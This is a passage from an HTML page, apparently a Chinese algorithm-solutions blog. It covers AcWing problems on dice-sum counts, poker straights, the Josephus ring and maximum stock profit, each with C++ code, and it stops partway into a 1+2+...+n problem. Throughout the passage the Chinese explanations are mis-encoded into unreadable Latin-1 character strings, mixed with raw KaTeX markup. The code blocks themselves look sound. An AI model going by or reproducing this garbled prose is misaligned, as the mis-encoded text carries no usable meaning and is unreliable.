class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></p><p><strong>æ ·ä¾‹1</strong></p><pre><code>è¾“å…¥ï¼šn=1è¾“å‡ºï¼š[1, 1, 1, 1, 1, 1]è§£é‡Šï¼šæŠ•æ·1æ¬¡ï¼Œå¯èƒ½å‡ºç°çš„ç‚¹æ•°ä¸º1-6ï¼Œå…±è®¡6ç§ã€‚æ¯ç§ç‚¹æ•°éƒ½åªæœ‰1ç§æ·æ³•ã€‚æ‰€ä»¥è¾“å‡º[1, 1, 1, 1, 1, 1]ã€‚</code></pre><p><strong>æ ·ä¾‹2</strong></p><pre><code>è¾“å…¥ï¼šn=2è¾“å‡ºï¼š[1, 2, 3, 4, 5, 6, 5, 4, 3, 2, 1]è§£é‡Šï¼šæŠ•æ·2æ¬¡ï¼Œå¯èƒ½å‡ºç°çš„ç‚¹æ•°ä¸º2-12ï¼Œå…±è®¡11ç§ã€‚æ¯ç§ç‚¹æ•°å¯èƒ½æ·æ³•æ•°ç›®åˆ†åˆ«ä¸º1,2,3,4,5,6,5,4,3,2,1ã€‚      æ‰€ä»¥è¾“å‡º[1, 2, 3, 4, 5, 6, 5, 4, 3, 2, 1]ã€‚</code></pre><h3 id="ç®—æ³•1-dfsæš´åŠ›é€’å½’">ç®—æ³•1 dfsæš´åŠ›é€’å½’</h3><blockquote><p>ä¸æ¨èï¼Œä¼šå­˜åœ¨<strong>é‡å¤è®¡ç®—çŠ¶æ€</strong>çš„é—®é¢˜ï¼Œä¼šæŠ¥ <code>TLE(Time Limit Exceeded)</code> ã€‚</p><p>æ—¶é—´å¤æ‚åº¦: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>6</mn><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(6^n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfDice</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &lt;= <span class="number">6</span> * n; i++) res.<span class="built_in">push_back</span>(<span class="built_in">dfs</span>(n, i));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> sum)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!n) <span class="keyword">return</span> !sum;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) res += <span class="built_in">dfs</span>(n - <span class="number">1</span>, sum - i);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ç®—æ³•2-DP">ç®—æ³•2 DP</h3><p><strong>äºŒç»´å†™æ³•</strong></p><blockquote><p>çŠ¶æ€è¡¨ç¤º: <code>f[i][j]</code>è¡¨ç¤ºæŠ•æ·iæ¬¡æ€»ç‚¹æ•°ä¸ºjçš„æƒ…å†µæ•°ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfDice</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">6</span> * n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= <span class="number">6</span> * i; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="built_in">min</span>(j, <span class="number">6</span>); k++) &#123;</span><br><span class="line">          f[i][j] += f[i - <span class="number">1</span>][j - k];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(f[n].<span class="built_in">begin</span>() + n, f[n].<span class="built_in">end</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ä¸€ç»´å†™æ³•</strong></p><p>é‡‡ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–: ä»äºŒç»´é™ä¸ºä¸€ç»´<br>æ³¨æ„: éœ€è¦æ¸…é›¶ï¼Œæ¯”å¦‚ç¬¬3è½®[3â€¦18]ä¸ç¬¬2è½®[2â€¦12]æœ‰äº¤é›†[2â€¦12], è®¡ç®—äº¤é›†æ—¶éœ€è¦å…ˆæ¸…é™¤æ—§å€¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfDice</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">f</span><span class="params">(<span class="number">6</span> * n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) f[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">6</span> * i; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">        f[j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="built_in">min</span>(<span class="number">6</span>, j); k++)</span><br><span class="line">          f[j] += f[j - k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(f.<span class="built_in">begin</span>() + n, f.<span class="built_in">end</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ‰‘å…‹ç‰Œçš„é¡ºå­"><a href="https://www.acwing.com/problem/content/77/">æ‰‘å…‹ç‰Œçš„é¡ºå­</a></h2><p>ä»æ‰‘å…‹ç‰Œä¸­éšæœºæŠ½ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> å¼ ç‰Œï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯ä¸€ä¸ªé¡ºå­ï¼Œå³è¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> å¼ ç‰Œæ˜¯ä¸æ˜¯è¿ç»­çš„ã€‚</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>âˆ¼</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">2 \sim 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> ä¸ºæ•°å­—æœ¬èº«ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>J</mi></mrow><annotation encoding="application/x-tex">J</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn></mrow><annotation encoding="application/x-tex">13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">13</span></span></span></span>ï¼Œå¤§å°ç‹å¯ä»¥çœ‹åšä»»æ„æ•°å­—ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿ï¼Œå¤§å°ç‹å‡ä»¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> æ¥è¡¨ç¤ºï¼Œå¹¶ä¸”å‡è®¾è¿™å‰¯ç‰Œä¸­å¤§å°ç‹å‡æœ‰ä¸¤å¼ ã€‚</p><p><strong>æ ·ä¾‹1</strong></p><pre><code>è¾“å…¥ï¼š[8,9,10,11,12]è¾“å‡ºï¼štrue</code></pre><p><strong>æ ·ä¾‹2</strong></p><pre><code>è¾“å…¥ï¼š[0,8,9,11,12]è¾“å‡ºï¼štrue</code></pre><h3 id="æ¨¡æ‹Ÿæ³•-3">æ¨¡æ‹Ÿæ³•</h3><p>é¡ºå­æ¡ä»¶ï¼š</p><ol><li>é™¤0å¤–æ— é‡å¤æ•°å­—</li><li>ç”¨0èƒ½æŠŠç©ºä½å¡«ä¸Šï¼Œä½¿ä¹‹æˆä¸ºè¿ç»­æ•°å­—</li></ol><p>ç®—æ³•æ­¥éª¤ï¼š</p><ol><li>æ’åº</li><li>åˆ 0</li><li>åˆ¤æ–­æœ‰æ— é‡å¤</li><li>çœ‹æœ€å¤§å€¼ä¸æœ€å°å€¼çš„å·®è·æ˜¯å¦å°äºç­‰äº4</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isContinuous</span><span class="params">(vector&lt;<span class="type">int</span>&gt; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (nums[k] == <span class="number">0</span>) k++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k + <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums.<span class="built_in">back</span>() - nums[k] &lt;= <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/78/">åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—â˜…</a></h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>â€¦</mo><mo separator="true">,</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0, 1, â€¦, n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> è¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>&gt;</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n&gt;0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> æ’æˆä¸€ä¸ªåœ†åœˆï¼Œä»æ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¼€å§‹æ¯æ¬¡ä»è¿™ä¸ªåœ†åœˆé‡Œåˆ é™¤ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ•°å­—ã€‚</p><p>æ±‚å‡ºè¿™ä¸ªåœ†åœˆé‡Œå‰©ä¸‹çš„æœ€åä¸€ä¸ªæ•°å­—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>4000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 4000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šn=5 , m=3è¾“å‡ºï¼š3</code></pre><h3 id="çº¦ç‘Ÿå¤«ç¯é—®é¢˜">çº¦ç‘Ÿå¤«ç¯é—®é¢˜</h3><p>é‡‡ç”¨é€’å½’æ–¹æ³•è§£å†³æ­¤é—®é¢˜, æ—§åæ ‡ç³»ä¸­f(n, m)é—®é¢˜è½¬åŒ–ä¸ºæ–°åæ ‡ç³»f(n - 1, m)é—®é¢˜<br>æ–°åæ ‡ç³»èµ·ç‚¹ åœ¨ æ—§åæ ‡ç³»ä¸­ä¸‹æ ‡ä¸ºm, å› æ­¤ç‚¹åœ¨æ—§åæ ‡ç³»ä¸­åæ ‡ = (åœ¨æ–°åæ ‡ç³»ä¸­åæ ‡ + m) % n</p><p>æ—¶é—´å¤æ‚åº¦ä¸º $ O(n)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">lastRemaining</span>(n - <span class="number">1</span>, m) + m) % n;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦â˜…"><a href="https://www.acwing.com/problem/content/79/">è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦â˜…</a></h2><p>å‡è®¾æŠŠæŸè‚¡ç¥¨çš„ä»·æ ¼æŒ‰ç…§æ—¶é—´å…ˆåé¡ºåºå­˜å‚¨åœ¨æ•°ç»„ä¸­ï¼Œè¯·é—®ä¹°å– <strong>ä¸€æ¬¡</strong> è¯¥è‚¡ç¥¨å¯èƒ½è·å¾—çš„åˆ©æ¶¦æ˜¯å¤šå°‘ï¼Ÿ</p><p>ä¾‹å¦‚ä¸€åªè‚¡ç¥¨åœ¨æŸäº›æ—¶é—´èŠ‚ç‚¹çš„ä»·æ ¼ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>9</mn><mo separator="true">,</mo><mn>11</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>16</mn><mo separator="true">,</mo><mn>14</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[9, 11, 8, 5, 7, 12, 16, 14]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">11</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">16</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">14</span><span class="mclose">]</span></span></span></span>ã€‚</p><p>å¦‚æœæˆ‘ä»¬èƒ½åœ¨ä»·æ ¼ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> çš„æ—¶å€™ä¹°å…¥å¹¶åœ¨ä»·æ ¼ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">16</span></span></span></span> æ—¶å–å‡ºï¼Œåˆ™èƒ½æ”¶è·æœ€å¤§çš„åˆ©æ¶¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[9, 11, 8, 5, 7, 12, 16, 14]è¾“å‡ºï¼š11</code></pre><h3 id="æ¨¡æ‹Ÿæ³•-4">æ¨¡æ‹Ÿæ³•</h3><p>å¦‚ä½•æšä¸¾: ä»¥å“ªå¤©å–å‡ºè¿›è¡Œæšä¸¾<br>å¦‚ä½•æ±‚å‰iå¤©çš„æœ€å°å€¼: ç»´æŠ¤ä¸€ä¸ªå˜é‡minvè®°å½•å‰iå¤©çš„æœ€å°è¿›ä»·</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">maxDiff</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>, minv = nums[<span class="number">0</span>];  <span class="comment">// æœ€ä½è¿›ä»·åˆå§‹åŒ–ä¸ºnums[0], è€Œé0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      res = <span class="built_in">max</span>(res, nums[i] - minv);</span><br><span class="line">      minv = <span class="built_in">min</span>(minv, nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ±‚1-2-â€¦-nâ˜…"><a href="https://www.acwing.com/problem/content/80/">æ±‚1+2+â€¦+nâ˜…</a></h2><p>æ±‚ <span class="katex"><span class="katex-mathml"><math 